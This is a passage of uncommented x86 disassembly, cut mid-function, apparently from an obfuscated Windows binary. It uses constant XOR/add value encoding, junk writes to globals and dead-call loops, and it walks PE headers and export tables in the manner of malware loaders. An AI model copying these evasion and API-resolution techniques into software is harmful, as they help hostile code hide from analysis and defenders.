  414f32:	jmp    0x414ef9
  414f37:	xor    eax,eax
  414f39:	add    DWORD PTR ds:0x437773,ecx
  414f3f:	mov    eax,ds:0x437217
  414f44:	mov    eax,DWORD PTR [eax]
  414f46:	sbb    DWORD PTR ds:0x4377ab,ebx
  414f4c:	mov    ecx,DWORD PTR [ebp-0x14]
  414f4f:	add    eax,DWORD PTR [ecx]
  414f51:	mov    DWORD PTR [ebp-0xc],eax
  414f54:	mov    eax,ds:0x43739f
  414f59:	mov    eax,DWORD PTR [eax+0x198]
  414f5f:	xor    DWORD PTR ds:0x43771b,0x3e1f
  414f69:	mov    ecx,DWORD PTR [ebp+0x8]
  414f6c:	add    DWORD PTR ds:0x437723,0x6248
  414f76:	xor    ecx,0x75108b5
  414f7c:	xor    DWORD PTR ds:0x437747,0x991
  414f86:	add    ecx,0x3272fb
  414f8c:	mov    DWORD PTR ds:0x43774b,0x3d8f
  414f96:	cmp    DWORD PTR [eax],ecx
  414f98:	je     0x414fb2
  414f9e:	mov    DWORD PTR ds:0x437727,0x79bb
  414fa8:	jmp    0x41548c
  414fad:	jmp    0x41548c
  414fb2:	mov    DWORD PTR ds:0x437767,0x75b9
  414fbc:	mov    eax,DWORD PTR [ebp+0x8]
  414fbf:	mov    DWORD PTR ds:0x4377b7,0x4cc7
  414fc9:	cmp    eax,DWORD PTR [ebp+0xc]
  414fcc:	mov    DWORD PTR ds:0x4377ab,0x4de3
  414fd6:	je     0x41548c
  414fdc:	or     ecx,edx
  414fde:	lea    eax,[ebp-0x18]
  414fe1:	mov    DWORD PTR [ebp-0x34],eax
  414fe4:	or     DWORD PTR ds:0x437753,0x437727
  414fee:	mov    eax,DWORD PTR [ebp+0x10]
  414ff1:	mov    edx,DWORD PTR ds:0x437793
  414ff7:	and    DWORD PTR ds:0x437713,edx
  414ffd:	xor    eax,0x75108b5
  415002:	add    eax,0x3272fb
  415007:	mov    ecx,DWORD PTR [ebp-0x34]
  41500a:	mov    DWORD PTR [ecx],eax
  41500c:	mov    eax,DWORD PTR [ebp+0x8]
  41500f:	sbb    ecx,ecx
  415011:	xor    eax,0x75108b5
  415016:	or     ecx,DWORD PTR ds:0x437767
  41501c:	add    eax,0x3272fb
  415021:	mov    ecx,DWORD PTR [ebp+0xc]
  415024:	xor    DWORD PTR ds:0x437767,0x1dfa
  41502e:	xor    ecx,0x75108b5
  415034:	not    DWORD PTR ds:0x437793
  41503a:	add    ecx,0x3272fb
  415040:	mov    edx,DWORD PTR [ebp-0xc]
  415043:	imul   ecx,DWORD PTR [edx]
  415046:	mov    DWORD PTR ds:0x4377a3,0x407a
  415050:	cmp    eax,ecx
  415052:	mov    DWORD PTR ds:0x437747,0x4754
  41505c:	je     0x415286
  415062:	sub    DWORD PTR ds:0x437773,ebx
  415068:	mov    eax,DWORD PTR [ebp-0x14]
  41506b:	inc    ecx
  41506c:	mov    DWORD PTR [ebp-0x4c],eax
  41506f:	mov    eax,DWORD PTR [ebp-0x4c]
  415072:	mov    ecx,DWORD PTR [ebp-0x18]
  415075:	sub    DWORD PTR ds:0x437757,0x437737
  41507f:	add    ecx,DWORD PTR [eax]
  415081:	and    DWORD PTR ds:0x43779f,0x0
  41508b:	xor    eax,eax
  41508d:	xor    eax,DWORD PTR ds:0x43779f
  415093:	inc    eax
  415094:	mov    ds:0x43779f,eax
  415099:	cmp    DWORD PTR ds:0x43779f,0x6
  4150a0:	jl     0x4150e8
  4150a6:	jmp    0x4150c3
  4150ab:	push   0x43772b
  4150b0:	push   0x765e
  4150b5:	push   DWORD PTR [ebp-0x24]
  4150b8:	push   0x1ae5
  4150bd:	call   DWORD PTR ds:0x43c9e4
  4150c3:	cmp    DWORD PTR ds:0x43779f,0x5
  4150ca:	jne    0x4150db
  4150d0:	mov    eax,ds:0x43779f
  4150d5:	inc    eax
  4150d6:	mov    ds:0x43779f,eax
  4150db:	cmp    DWORD PTR ds:0x43779f,0x1c
  4150e2:	jb     0x41508b
  4150e8:	mov    eax,DWORD PTR [ebp-0x4c]
  4150eb:	add    DWORD PTR ds:0x437767,0x43771f
  4150f5:	mov    DWORD PTR [eax],ecx
  4150f7:	adc    DWORD PTR ds:0x43771f,0x57c4
  415101:	mov    eax,DWORD PTR [ebp-0x14]
  415104:	mov    DWORD PTR [ebp-0x50],eax
  415107:	and    DWORD PTR ds:0x43774b,0x0
  415111:	mov    ecx,DWORD PTR ds:0x43774b
  415117:	inc    ecx
  415118:	mov    DWORD PTR ds:0x43774b,ecx
  41511e:	cmp    DWORD PTR ds:0x43774b,0x4
  415125:	jbe    0x415167
  41512b:	jmp    0x415140
  415130:	push   0x437773
  415135:	push   0x69a7
  41513a:	call   DWORD PTR ds:0x43c9e8
  415140:	cmp    DWORD PTR ds:0x43774b,0x3
  415147:	jne    0x41515a
  41514d:	mov    ecx,DWORD PTR ds:0x43774b
  415153:	inc    ecx
  415154:	mov    DWORD PTR ds:0x43774b,ecx
  41515a:	cmp    DWORD PTR ds:0x43774b,0x16
  415161:	jb     0x415111
  415167:	mov    eax,DWORD PTR [ebp+0xc]
  41516a:	xor    eax,0x75108b5
  41516f:	add    eax,0x3272fb
  415174:	and    DWORD PTR ds:0x43774b,0x0
  41517e:	mov    ecx,DWORD PTR ds:0x43774b
  415184:	inc    ecx
  415185:	mov    DWORD PTR ds:0x43774b,ecx
  41518b:	cmp    DWORD PTR ds:0x43774b,0x6
  415192:	jbe    0x4151ec
  415198:	jmp    0x4151c5
  41519d:	push   0x69fb
  4151a2:	push   DWORD PTR [ebp-0x14]
  4151a5:	push   0x4075
  4151aa:	push   0x1f01
  4151af:	push   DWORD PTR [ebp-0x1c]
  4151b2:	push   0x802b
  4151b7:	push   DWORD PTR [ebp-0x28]
  4151ba:	push   0x43700d
  4151bf:	call   DWORD PTR ds:0x43c9ec
  4151c5:	cmp    DWORD PTR ds:0x43774b,0x5
  4151cc:	jne    0x4151df
  4151d2:	mov    ecx,DWORD PTR ds:0x43774b
  4151d8:	inc    ecx
  4151d9:	mov    DWORD PTR ds:0x43774b,ecx
  4151df:	cmp    DWORD PTR ds:0x43774b,0x11
  4151e6:	jb     0x41517e
  4151ec:	mov    ecx,DWORD PTR [ebp-0x50]
  4151ef:	imul   eax,DWORD PTR [ecx]
  4151f2:	sbb    ecx,0xf91
  4151f8:	mov    ecx,DWORD PTR [ebp-0x50]
  4151fb:	mov    DWORD PTR ds:0x437747,0x499d
  415205:	mov    DWORD PTR [ecx],eax
  415207:	mov    eax,DWORD PTR [ebp-0x14]
  41520a:	mov    DWORD PTR ds:0x437777,0x1a
  415214:	cmp    DWORD PTR ds:0x437777,0x0
  41521b:	je     0x415265
  415221:	cmp    DWORD PTR ds:0x437777,0x21
  415228:	jbe    0x415265
  41522e:	jmp    0x415253
  415233:	push   0x3847
  415238:	push   0x437787
  41523d:	push   DWORD PTR [ebp-0x28]
  415240:	push   DWORD PTR [ebp-0x10]
  415243:	push   0x4f57
  415248:	push   0x7258
  41524d:	call   DWORD PTR ds:0x43c9f0
  415253:	mov    ecx,DWORD PTR ds:0x437777
  415259:	dec    ecx
  41525a:	mov    DWORD PTR ds:0x437777,ecx
  415260:	jmp    0x415214
  415265:	mov    DWORD PTR [ebp-0x54],eax
  415268:	mov    eax,DWORD PTR [ebp+0x10]
  41526b:	xor    eax,0x75108b5
  415270:	add    eax,0x3272fb
  415275:	mov    ecx,DWORD PTR [ebp-0x54]
  415278:	mov    ecx,DWORD PTR [ecx]
  41527a:	sub    ecx,eax
  41527c:	mov    eax,DWORD PTR [ebp-0x54]
  41527f:	mov    DWORD PTR [eax],ecx
  415281:	jmp    0x4152b8
  415286:	mov    eax,DWORD PTR [ebp-0x14]
  415289:	mov    DWORD PTR [ebp-0x58],eax
  41528c:	mov    eax,DWORD PTR [ebp+0x14]
  41528f:	mov    ecx,DWORD PTR [ebp-0x58]
  415292:	xor    eax,DWORD PTR [ecx]
  415294:	mov    ecx,DWORD PTR [ebp-0x58]
  415297:	mov    DWORD PTR [ecx],eax
  415299:	mov    eax,DWORD PTR [ebp-0x14]
  41529c:	mov    DWORD PTR [ebp-0x5c],eax
  41529f:	mov    eax,DWORD PTR [ebp+0x10]
  4152a2:	xor    eax,0x75108b5
  4152a7:	add    eax,0x3272fb
  4152ac:	mov    ecx,DWORD PTR [ebp-0x5c]
  4152af:	mov    ecx,DWORD PTR [ecx]
  4152b1:	sub    ecx,eax
  4152b3:	mov    eax,DWORD PTR [ebp-0x5c]
  4152b6:	mov    DWORD PTR [eax],ecx
  4152b8:	mov    eax,DWORD PTR [ebp-0x14]
  4152bb:	mov    ecx,DWORD PTR [ebp-0xc]
  4152be:	add    ecx,DWORD PTR [eax]
  4152c0:	mov    DWORD PTR [ebp-0xc],ecx
  4152c3:	mov    eax,DWORD PTR [ebp+0xc]
  4152c6:	xor    eax,0x75108b5
  4152cb:	add    eax,0x3272fb
  4152d0:	mov    ecx,DWORD PTR [ebp+0xc]
  4152d3:	xor    ecx,0x75108b5
  4152d9:	mov    edx,DWORD PTR [ebp+0xc]
  4152dc:	xor    edx,0x75108b5
  4152e2:	lea    ecx,[ecx+edx*1+0x64e5f6]
  4152e9:	mov    edx,DWORD PTR [ebp+0xc]
  4152ec:	xor    edx,0x75108b5
  4152f2:	add    edx,0x3272fb
  4152f8:	imul   ecx,edx
  4152fb:	sub    eax,ecx
  4152fd:	mov    ecx,DWORD PTR [ebp-0x14]
  415300:	cmp    DWORD PTR [ecx],eax
  415302:	jg     0x41532c
  415308:	mov    eax,DWORD PTR [ebp-0x14]
  41530b:	mov    DWORD PTR [ebp-0x60],eax
  41530e:	mov    eax,DWORD PTR [ebp+0x10]
  415311:	xor    eax,0x75108b5
  415316:	add    eax,0x3272fb
  41531b:	mov    ecx,DWORD PTR [ebp-0x60]
  41531e:	mov    ecx,DWORD PTR [ecx]
  415320:	sub    ecx,eax
  415322:	mov    eax,DWORD PTR [ebp-0x60]
  415325:	mov    DWORD PTR [eax],ecx
  415327:	jmp    0x41534b
  41532c:	mov    eax,DWORD PTR [ebp-0x14]
  41532f:	mov    DWORD PTR [ebp-0x64],eax
  415332:	mov    eax,DWORD PTR [ebp+0x10]
  415335:	xor    eax,0x75108b5
  41533a:	mov    ecx,DWORD PTR [ebp-0x64]
  41533d:	mov    ecx,DWORD PTR [ecx]
  41533f:	lea    eax,[eax+ecx*1+0x3272fb]
  415346:	mov    ecx,DWORD PTR [ebp-0x64]
  415349:	mov    DWORD PTR [ecx],eax
  41534b:	mov    eax,DWORD PTR [ebp-0xc]
  41534e:	mov    eax,DWORD PTR [eax]
  415350:	mov    DWORD PTR [ebp-0x2c],eax
  415353:	mov    eax,DWORD PTR [ebp-0x8]
  415356:	xor    eax,0x75108b5
  41535b:	add    eax,0x3272fa
  415360:	not    eax
  415362:	and    eax,DWORD PTR [ebp-0x2c]
  415365:	mov    DWORD PTR [ebp-0x2c],eax
  415368:	lea    eax,[ebp-0x20]
  41536b:	mov    DWORD PTR [ebp-0x38],eax
  41536e:	mov    eax,DWORD PTR [ebp-0x38]
  415371:	mov    DWORD PTR [eax],0x7097b85d
  415377:	mov    DWORD PTR [eax+0x4],0xffffffff
  41537e:	lea    eax,[ebp-0x28]
  415381:	mov    DWORD PTR [ebp-0x30],eax
  415384:	mov    eax,DWORD PTR [ebp-0x30]
  415387:	mov    DWORD PTR [eax],0x7097a55f
  41538d:	mov    DWORD PTR [eax+0x4],0xffffffff
  415394:	mov    eax,DWORD PTR [ebp-0x2c]
  415397:	movzx  eax,WORD PTR [eax]
  41539a:	mov    ecx,DWORD PTR [ebp-0x20]
  41539d:	mov    edx,DWORD PTR [ebp-0x1c]
  4153a0:	xor    ecx,0x8a29a14b
  4153a6:	xor    edx,0x0
  4153a9:	add    ecx,0x5424137
  4153af:	adc    edx,0x0
  4153b2:	movzx  ecx,cx
  4153b5:	cmp    eax,ecx
  4153b7:	je     0x4153dc
  4153bd:	mov    eax,DWORD PTR [ebp-0x8]
  4153c0:	xor    eax,0x75108b5
  4153c5:	add    eax,0x3272fb
  4153ca:	mov    ecx,DWORD PTR [ebp-0x2c]
  4153cd:	sub    ecx,eax
  4153cf:	mov    DWORD PTR [ebp-0x2c],ecx
  4153d2:	jmp    0x415368
  4153d7:	jmp    0x41548c
  4153dc:	lea    eax,[ebp-0x44]
  4153df:	mov    DWORD PTR [ebp-0x40],eax
  4153e2:	mov    eax,DWORD PTR [ebp-0x2c]
  4153e5:	mov    ecx,DWORD PTR [ebp-0x2c]
  4153e8:	add    ecx,DWORD PTR [eax+0x3c]
  4153eb:	mov    eax,DWORD PTR [ebp-0x10]
  4153ee:	mov    eax,DWORD PTR [eax]
  4153f0:	mov    edx,DWORD PTR [ebp-0x40]
  4153f3:	mov    eax,DWORD PTR [ecx+eax*8+0x78]
  4153f7:	mov    DWORD PTR [edx],eax
  4153f9:	lea    eax,[ebp-0x3c]
  4153fc:	mov    DWORD PTR [ebp-0x48],eax
  4153ff:	mov    eax,DWORD PTR [ebp+0x8]
  415402:	xor    eax,0x75108b5
  415407:	add    eax,0x3272fb
  41540c:	mov    ecx,DWORD PTR [ebp-0x48]
  41540f:	mov    DWORD PTR [ecx],eax
  415411:	mov    eax,DWORD PTR [ebp-0x44]
  415414:	mov    ecx,DWORD PTR [ebp+0x8]
  415417:	xor    ecx,0x75108b5
  41541d:	add    ecx,0x3272fb
  415423:	cmp    eax,ecx
  415425:	je     0x41547b
  41542b:	mov    eax,DWORD PTR [ebp-0x2c]
  41542e:	add    eax,DWORD PTR [ebp-0x44]
  415431:	mov    ecx,DWORD PTR [ebp-0x48]
  415434:	mov    DWORD PTR [ecx],eax
  415436:	mov    eax,DWORD PTR [ebp-0x3c]
  415439:	mov    eax,DWORD PTR [eax+0xc]
  41543c:	mov    ecx,DWORD PTR [ebp-0x2c]
  41543f:	movzx  eax,WORD PTR [ecx+eax*1]
  415443:	mov    ecx,DWORD PTR [ebp-0x28]
  415446:	mov    edx,DWORD PTR [ebp-0x24]
  415449:	xor    ecx,0x8a29a14b
  41544f:	xor    edx,0x0
  415452:	add    ecx,0x5424137
  415458:	adc    edx,0x0
  41545b:	movzx  ecx,cx
  41545e:	cmp    eax,ecx
  415460:	jne    0x41547b
  415466:	mov    eax,ds:0x43739f
  41546b:	mov    eax,DWORD PTR [eax+0x198]
  415471:	mov    ecx,DWORD PTR [ebp-0x2c]
  415474:	mov    DWORD PTR [eax],ecx
  415476:	jmp    0x41548c
  41547b:	push   DWORD PTR [ebp+0x14]
  41547e:	push   DWORD PTR [ebp+0x10]
  415481:	push   DWORD PTR [ebp+0xc]
  415484:	push   DWORD PTR [ebp+0x8]
  415487:	call   0x414de4
  41548c:	leave  
  41548d:	ret    0x10
  415490:	push   ebp
  415491:	mov    ebp,esp
  415493:	push   ecx
  415494:	or     DWORD PTR ds:0x437737,0x437717
  41549e:	push   ecx
  41549f:	sub    DWORD PTR ds:0x437757,ebx
  4154a5:	lea    eax,[ebp-0x8]
  4154a8:	adc    ecx,DWORD PTR ds:0x43778b
  4154ae:	mov    DWORD PTR [ebp-0x4],eax
  4154b1:	mov    eax,ds:0x43775b
  4154b6:	xor    DWORD PTR ds:0x43777f,eax
  4154bc:	mov    eax,DWORD PTR [ebp-0x8]
  4154bf:	and    ecx,DWORD PTR ds:0x43776f
  4154c5:	mov    ecx,DWORD PTR [ebp-0x4]
  4154c8:	mov    ecx,DWORD PTR [ecx]
  4154ca:	sub    eax,ecx
  4154cc:	mov    DWORD PTR [ebp-0x8],eax
  4154cf:	or     DWORD PTR ds:0x437733,0x437787
  4154d9:	xor    eax,eax
  4154db:	and    DWORD PTR ds:0x437747,0x0
  4154e5:	xor    ecx,ecx
  4154e7:	or     ecx,DWORD PTR ds:0x437747
  4154ed:	inc    ecx
  4154ee:	mov    DWORD PTR ds:0x437747,ecx
  4154f4:	cmp    DWORD PTR ds:0x437747,0x1d
  4154fb:	jbe    0x41552d
  415501:	jmp    0x415520
  415506:	push   0x43772f
  41550b:	push   0x43773f
  415510:	push   0x7558
  415515:	push   0x4370a4
  41551a:	call   DWORD PTR ds:0x43c9f4
  415520:	cmp    DWORD PTR ds:0x437747,0x1c
  415527:	jb     0x4154e5
  41552d:	mov    eax,DWORD PTR [ebp-0x4]
  415530:	not    DWORD PTR ds:0x43778f
  415536:	mov    eax,DWORD PTR [eax]
  415538:	and    DWORD PTR ds:0x437767,0x0
  415542:	mov    ecx,DWORD PTR ds:0x437767
  415548:	inc    ecx
  415549:	mov    DWORD PTR ds:0x437767,ecx
  41554f:	cmp    DWORD PTR ds:0x437767,0x7
  415556:	jb     0x41559b
  41555c:	jmp    0x415574
  415561:	push   0x437767
  415566:	push   0x437733
  41556b:	push   DWORD PTR [ebp-0x28]
  41556e:	call   DWORD PTR ds:0x43c9f8
  415574:	cmp    DWORD PTR ds:0x437767,0x6
  41557b:	jne    0x41558e
  415581:	mov    ecx,DWORD PTR ds:0x437767
  415587:	inc    ecx
  415588:	mov    DWORD PTR ds:0x437767,ecx
  41558e:	cmp    DWORD PTR ds:0x437767,0x12
  415595:	jb     0x415542
  41559b:	xor    eax,0xf89c85bc
  4155a0:	mov    ecx,DWORD PTR [ebp-0x4]
  4155a3:	mov    DWORD PTR [ecx],eax
  4155a5:	mov    eax,DWORD PTR [ebp+0xc]
  4155a8:	xor    eax,0x75108b5
  4155ad:	add    eax,0x3272fb
  4155b2:	mov    ecx,DWORD PTR [ebp+0x10]
  4155b5:	mov    DWORD PTR [ecx+0x4],eax
  4155b8:	mov    eax,DWORD PTR [ebp+0x14]
  4155bb:	mov    ecx,DWORD PTR [ebp+0x10]
  4155be:	mov    DWORD PTR [ecx+0x8],eax
  4155c1:	mov    eax,DWORD PTR [ebp+0x18]
  4155c4:	mov    ecx,DWORD PTR [ebp+0x10]
  4155c7:	mov    DWORD PTR [ecx+0xc],eax
  4155ca:	mov    eax,DWORD PTR [ebp+0x1c]
  4155cd:	mov    ecx,DWORD PTR [ebp+0x10]
  4155d0:	mov    DWORD PTR [ecx+0x10],eax
  4155d3:	mov    eax,DWORD PTR [ebp-0x8]
  4155d6:	xor    eax,0x75108b5
  4155db:	add    eax,0x3272fb
  4155e0:	mov    ecx,DWORD PTR [ebp+0x10]
  4155e3:	mov    DWORD PTR [ecx],eax
  4155e5:	mov    eax,DWORD PTR [ebp+0x8]
  4155e8:	xor    eax,0x75108b5
  4155ed:	add    eax,0x3272fb
  4155f2:	leave  
  4155f3:	ret    0x18
  4155f6:	push   ebp
  4155f7:	mov    ebp,esp
  4155f9:	sub    esp,0x1ac
  4155ff:	add    eax,DWORD PTR ds:0x4377a7
  415605:	push   esi
  415606:	add    DWORD PTR ds:0x43771b,0x43779b
  415610:	mov    eax,DWORD PTR [ebp+0x8]
  415613:	xor    eax,0x75108b5
  415618:	add    eax,0x3272fb
  41561d:	xor    DWORD PTR ds:0x43777f,0x43779f
  415627:	mov    DWORD PTR [ebp-0x20],eax
  41562a:	movzx  eax,BYTE PTR ds:0x437797
  415631:	adc    eax,DWORD PTR ds:0x4377a3
  415637:	mov    ds:0x437797,eax
  41563c:	mov    eax,ds:0x43721f
  415641:	mov    eax,DWORD PTR [eax]
  415643:	xor    DWORD PTR ds:0x437787,0xb5b
  41564d:	mov    DWORD PTR [ebp-0x10],eax
  415650:	movzx  eax,BYTE PTR ds:0x4377a7
  415657:	and    eax,DWORD PTR ds:0x437793
  41565d:	mov    ds:0x4377a7,eax
  415662:	mov    eax,ds:0x43742f
  415667:	mov    eax,DWORD PTR [eax]
  415669:	mov    DWORD PTR [ebp-0x14],eax
  41566c:	inc    eax
  41566d:	mov    eax,DWORD PTR [ebp-0x10]
  415670:	and    DWORD PTR ds:0x4377a3,0x4377b3
  41567a:	xor    ecx,ecx
  41567c:	sub    eax,0x5424137
  415681:	mov    DWORD PTR ds:0x43779b,0x4f0f
  41568b:	sbb    ecx,0x0
  41568e:	xor    eax,0x8a29a14b
  415693:	sub    DWORD PTR ds:0x43772f,0x7a71
  41569d:	xor    ecx,0x0
  4156a0:	mov    DWORD PTR [ebp-0x1a4],eax
  4156a6:	mov    DWORD PTR ds:0x43777b,0x4c82
  4156b0:	mov    DWORD PTR [ebp-0x1a0],ecx
  4156b6:	mov    DWORD PTR ds:0x437793,0x4615
  4156c0:	cmp    DWORD PTR [ebp-0x1a4],0x70941f82
  4156ca:	jne    0x4156f1
  4156d0:	mov    DWORD PTR ds:0x43776f,0x15aa
  4156da:	cmp    DWORD PTR [ebp-0x1a0],0xffffffff
  4156e1:	mov    DWORD PTR ds:0x437733,0x56fb
  4156eb:	je     0x415a9e
  4156f1:	and    DWORD PTR ds:0x437767,0x0
  4156fb:	jmp    0x41570b
  415700:	mov    eax,ds:0x437767
  415705:	inc    eax
  415706:	mov    ds:0x437767,eax
  41570b:	cmp    DWORD PTR ds:0x437767,0x14
  415712:	jae    0x415748
  415718:	cmp    DWORD PTR ds:0x437767,0x1f
  41571f:	jge    0x415748
  415725:	jmp    0x415743
  41572a:	push   0x3245
  41572f:	push   DWORD PTR [ebp-0xc]
  415732:	push   DWORD PTR [ebp-0x20]
  415735:	push   0x2d62
  41573a:	push   DWORD PTR [ebp-0x1c]
  41573d:	call   DWORD PTR ds:0x43c9fc
  415743:	jmp    0x415700
  415748:	mov    eax,DWORD PTR [ebp-0x14]
  41574b:	sub    DWORD PTR ds:0x437753,0x4f0
  415755:	xor    ecx,ecx
  415757:	xor    DWORD PTR ds:0x437777,0x1d12
  415761:	sub    eax,0x5424137
  415766:	mov    DWORD PTR ds:0x437777,0x6f96
  415770:	sbb    ecx,0x0
  415773:	xor    eax,0x8a29a14b
  415778:	xor    ecx,0x0
  41577b:	mov    DWORD PTR [ebp-0x1ac],eax
  415781:	mov    DWORD PTR ds:0x43775b,0x49f3
  41578b:	mov    DWORD PTR [ebp-0x1a8],ecx
  415791:	cmp    DWORD PTR [ebp-0x1ac],0x70941f82
  41579b:	mov    DWORD PTR ds:0x437773,0xfeb
  4157a5:	jne    0x4157c2
  4157ab:	mov    DWORD PTR ds:0x43773f,0x71a9
  4157b5:	cmp    DWORD PTR [ebp-0x1a8],0xffffffff
  4157bc:	je     0x415a9e
  4157c2:	dec    eax
  4157c3:	mov    eax,DWORD PTR [ebp+0x10]
  4157c6:	xor    ecx,ecx
  4157c8:	or     ecx,DWORD PTR ds:0x43776b
  4157ce:	sbb    ecx,DWORD PTR ds:0x43772f
  4157d4:	mov    DWORD PTR ds:0x43776b,ecx
  4157da:	xor    eax,0x75108b5
  4157df:	xor    ecx,ecx
  4157e1:	or     ecx,DWORD PTR ds:0x4384a7
  4157e7:	mov    ecx,DWORD PTR [ecx]
  4157e9:	and    DWORD PTR ds:0x43772f,ecx
  4157ef:	add    eax,0x3272fb
  4157f4:	xor    ecx,DWORD PTR ds:0x43779f
  4157fa:	mov    DWORD PTR [ebp-0x1c],eax
  4157fd:	mov    DWORD PTR ds:0x437727,0x14
  415807:	cmp    DWORD PTR ds:0x437727,0x0
  41580e:	je     0x415862
  415814:	cmp    DWORD PTR ds:0x437727,0x5
  41581b:	ja     0x415862
  415821:	jmp    0x41583a
  415826:	push   DWORD PTR [ebp-0x28]
  415829:	push   DWORD PTR [ebp-0x14]
  41582c:	push   0x4370f4
  415831:	push   DWORD PTR [ebp-0x18]
  415834:	call   DWORD PTR ds:0x43ca00
  41583a:	cmp    DWORD PTR ds:0x437727,0x6
  415841:	jne    0x415852
  415847:	mov    eax,ds:0x437727
  41584c:	dec    eax
  41584d:	mov    ds:0x437727,eax
  415852:	mov    eax,ds:0x437727
  415857:	dec    eax
  415858:	mov    ds:0x437727,eax
  41585d:	jmp    0x415807
  415862:	mov    eax,ds:0x43739f
  415867:	mov    DWORD PTR [ebp-0x18],eax
  41586a:	movzx  ecx,BYTE PTR ds:0x43770f
  415871:	xor    DWORD PTR ds:0x43775b,ecx
  415877:	mov    eax,DWORD PTR [ebp-0x10]
  41587a:	and    DWORD PTR ds:0x4377b3,0x0
  415884:	jmp    0x415896
  415889:	mov    ecx,DWORD PTR ds:0x4377b3
  41588f:	inc    ecx
  415890:	mov    DWORD PTR ds:0x4377b3,ecx
  415896:	cmp    DWORD PTR ds:0x4377b3,0x1b
  41589d:	jae    0x4158c5
  4158a3:	cmp    DWORD PTR ds:0x4377b3,0x21
  4158aa:	jb     0x4158c5
  4158b0:	jmp    0x4158c0
  4158b5:	push   0x6097
  4158ba:	call   DWORD PTR ds:0x43ca04
  4158c0:	jmp    0x415889
  4158c5:	mov    DWORD PTR [ebp-0x24],eax
  4158c8:	mov    eax,DWORD PTR [ebp-0x14]
  4158cb:	add    eax,0x4
  4158ce:	mov    ecx,DWORD PTR [ebp-0x24]
  4158d1:	sub    DWORD PTR ds:0x43771f,0x631a
  4158db:	sub    eax,ecx
  4158dd:	mov    DWORD PTR [ebp-0x4],eax
  4158e0:	xor    eax,0x956
  4158e5:	mov    DWORD PTR [ebp-0x78],0xf89c85bc
  4158ec:	xor    eax,DWORD PTR ds:0x43775f
  4158f2:	mov    eax,DWORD PTR [ebp-0x24]
  4158f5:	mov    DWORD PTR [ebp-0x74],eax
  4158f8:	mov    DWORD PTR ds:0x437723,0x1a
  415902:	cmp    DWORD PTR ds:0x437723,0x0
  415909:	je     0x415955
  41590f:	cmp    DWORD PTR ds:0x437723,0xa
  415916:	jle    0x415955
  41591c:	jmp    0x41592d
  415921:	push   DWORD PTR [ebp-0x1c]
  415924:	push   DWORD PTR [ebp-0x1c]
  415927:	call   DWORD PTR ds:0x43ca08
  41592d:	cmp    DWORD PTR ds:0x437723,0xb
  415934:	jne    0x415945
  41593a:	mov    eax,ds:0x437723
  41593f:	dec    eax
  415940:	mov    ds:0x437723,eax
  415945:	mov    eax,ds:0x437723
  41594a:	dec    eax
  41594b:	mov    ds:0x437723,eax
  415950:	jmp    0x415902
  415955:	mov    eax,DWORD PTR [ebp-0x4]
  415958:	or     DWORD PTR ds:0x43774f,0x437717
  415962:	mov    DWORD PTR [ebp-0x70],eax
  415965:	xor    DWORD PTR ds:0x43771f,ebx
  41596b:	mov    eax,DWORD PTR [ebp+0x14]
  41596e:	xor    DWORD PTR ds:0x437713,0x4377af
  415978:	xor    eax,0x75108b5
  41597d:	xor    DWORD PTR ds:0x43770f,0x6763
  415987:	add    eax,0x3272fb
  41598c:	add    DWORD PTR ds:0x4377bb,0x6c9b
  415996:	mov    DWORD PTR [ebp-0x6c],eax
  415999:	sub    DWORD PTR ds:0x437723,0x4377af
  4159a3:	lea    eax,[ebp-0xc]
  4159a6:	not    DWORD PTR ds:0x43777b
  4159ac:	mov    DWORD PTR [ebp-0x68],eax
  4159af:	neg    DWORD PTR ds:0x43772f
  4159b5:	mov    eax,DWORD PTR [ebp-0x78]
  4159b8:	xor    DWORD PTR ds:0x437787,0x23e8
  4159c2:	xor    eax,0x75108b5
  4159c7:	sub    DWORD PTR ds:0x4377b3,0x919
  4159d1:	add    eax,0x3272fb
  4159d6:	mov    DWORD PTR [ebp-0x78],eax
  4159d9:	adc    DWORD PTR ds:0x4377af,0x561d
  4159e3:	lea    eax,[ebp-0x78]
  4159e6:	sub    DWORD PTR ds:0x43776b,0x437783
  4159f0:	push   eax
  4159f1:	mov    eax,ds:0x437787
  4159f6:	adc    DWORD PTR ds:0x43774f,eax
  4159fc:	mov    eax,DWORD PTR [ebp+0xc]
  4159ff:	or     DWORD PTR ds:0x4377a7,0x409b
  415a09:	xor    eax,0x75108b5
  415a0e:	or     DWORD PTR ds:0x437763,0x48d4
  415a18:	add    eax,0x3272fb
  415a1d:	xor    DWORD PTR ds:0x437737,0x4377bb
  415a27:	push   eax
  415a28:	mov    DWORD PTR ds:0x43770f,0x1d
  415a32:	cmp    DWORD PTR ds:0x43770f,0x0
  415a39:	je     0x415a79
  415a3f:	cmp    DWORD PTR ds:0x43770f,0x22
  415a46:	jle    0x415a79
  415a4c:	jmp    0x415a69
  415a51:	push   0x5a7a
  415a56:	push   DWORD PTR [ebp-0xc]
  415a59:	push   0x437773
  415a5e:	push   0x43774b
  415a63:	call   DWORD PTR ds:0x43ca0c
  415a69:	mov    eax,ds:0x43770f
  415a6e:	dec    eax
  415a6f:	mov    ds:0x43770f,eax
  415a74:	jmp    0x415a32
  415a79:	push   0x437315
  415a7e:	mov    eax,ds:0x4373bf
  415a83:	adc    DWORD PTR ds:0x43779f,0x43778f
  415a8d:	push   DWORD PTR [eax]
  415a8f:	sbb    DWORD PTR ds:0x43771b,0x437783
  415a99:	call   0x40d347
  415a9e:	mov    eax,DWORD PTR [ebp-0x24]
  415aa1:	or     DWORD PTR ds:0x43776f,0x10e2
  415aab:	mov    DWORD PTR [ebp-0x8],eax
  415aae:	mov    eax,DWORD PTR [ebp-0x4]
  415ab1:	add    DWORD PTR ds:0x437753,0x43776f
  415abb:	mov    DWORD PTR [ebp-0x2c],eax
  415abe:	sub    DWORD PTR ds:0x43776f,ebx
  415ac4:	mov    eax,DWORD PTR [ebp-0x8]
  415ac7:	sub    eax,0x3272fb
  415acc:	xor    eax,0x75108b5
  415ad1:	cmp    eax,0xf89c85b0
  415ad6:	jne    0x415ae9
  415adc:	dec    DWORD PTR ds:0x4377af
  415ae2:	xor    eax,eax
  415ae4:	jmp    0x42d445
  415ae9:	xor    eax,eax
  415aeb:	add    eax,DWORD PTR ds:0x43774f
  415af1:	and    DWORD PTR ds:0x43775f,eax
  415af7:	mov    eax,DWORD PTR [ebp-0x2c]
  415afa:	and    DWORD PTR ds:0x437717,0x0
  415b04:	jmp    0x415b16
  415b09:	mov    ecx,DWORD PTR ds:0x437717
  415b0f:	inc    ecx
  415b10:	mov    DWORD PTR ds:0x437717,ecx
  415b16:	cmp    DWORD PTR ds:0x437717,0x10
  415b1d:	jae    0x415b70
